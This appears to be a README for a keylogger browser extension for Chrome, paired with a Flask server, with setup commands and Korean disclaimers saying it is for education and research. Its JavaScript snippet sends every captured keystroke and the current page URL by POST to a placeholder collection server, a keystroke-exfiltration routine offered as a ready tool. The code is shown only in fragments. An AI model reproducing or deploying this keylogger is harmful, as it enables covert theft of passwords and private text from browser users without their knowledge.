#  Keylogger Chrome Extensions 

### Python flask server

`pip install flask`

`pip install flask_cors`

`pip insatll pyopenssl`

[SSL 자체 인증 받는법](https://blog.miguelgrinberg.com/post/running-your-flask-application-over-https)


### Main js code

```js
  ...
  xhr.open('POST', 'https://youradress:8080/log');
  xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
  xhr.send(JSON.stringify({
    key: event.key,
    window: window.location.href,
    ...
 ```
 # warning
 
 1. **악의적으로 사용할시 책임지지 않습니다.**
 2.  교육 및 연구 목적으로 개발되었습니다.
 3.  네트워크를 동일한 네트워크를 사용해야 키 기록을 받을수 있습니다.
 4.  서버에 한번 접속해야 작동합니다.
 
 
 
 
